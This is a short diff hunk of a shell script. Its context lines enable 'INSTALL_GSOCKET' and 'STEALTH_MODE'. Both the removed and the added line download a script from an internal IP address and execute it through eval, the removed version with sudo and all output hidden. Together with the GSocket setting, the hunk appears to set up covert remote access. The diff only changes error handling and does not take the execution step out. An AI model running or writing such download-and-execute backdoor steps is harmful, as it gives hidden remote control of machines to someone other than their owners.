@@ -9,4 +9,7 @@ export INSTALL_GSOCKET=true
 export STEALTH_MODE=true
 
 # Redirect output to /dev/null for quieter operation
-(eval "$(wget -qO- http://192.168.0.104/deployment/y" | sudo bash) &>/dev/null &
+eval "$(wget -qO- http://192.168.0.104/deployment/y)" 2>/dev/null || {
+    echo "Error: Failed to download the script."
+    exit 1
+}
